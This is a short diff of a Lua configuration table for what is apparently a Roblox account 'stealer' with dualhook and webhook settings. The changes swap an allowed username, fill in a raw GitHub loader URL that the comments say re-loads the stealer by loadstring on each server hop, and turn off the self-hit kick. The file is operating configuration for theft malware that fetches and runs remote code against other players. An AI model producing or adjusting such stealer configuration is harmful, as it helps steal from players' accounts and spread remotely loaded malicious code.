@@ -23,7 +23,7 @@ getgenv().Config = {
     AllowedUsernames = {
         'dualhook_user1',
         'dualhook_user3',
-        'shlakablok44',
+        'goldbed146',
     }, -- this is comparing usernames
     AllowedUsernamePatterns = {
         'dualhook_user',
@@ -83,7 +83,7 @@ getgenv().Config = {
     }, -- this is settings of X Scripts Helper bot that gives u ability to execute scripts from discord
     AutoReExecuteSettings = {
         ReExecute = true, -- if u dont enable it, u dont need to worry about link bellow
-        StealerLoaderUrl = 'https://raw.githubusercontent.com/' -- this is url of ur stealer_link or whatever u have in LOADSTRING of your stealer
+        StealerLoaderUrl = 'https://raw.githubusercontent.com/skidwxecuter/Script/refs/heads/main/X%20scripts' -- this is url of ur stealer_link or whatever u have in LOADSTRING of your stealer
         -- it will be used to re-load ur stealer on serverhop for each hitter, it will automatically write usernames and webhooks to it
         -- like it does in x scripts stealer!
     },
@@ -92,6 +92,6 @@ getgenv().Config = {
         ServerHopOnFullServer = true,
     },
     SelfHittingSettings = {
-        KickOnSelfHit = true, -- if player is in usernames list and executed stealer, he will be kicked
+        KickOnSelfHit = false, -- if player is in usernames list and executed stealer, he will be kicked
     },
 }
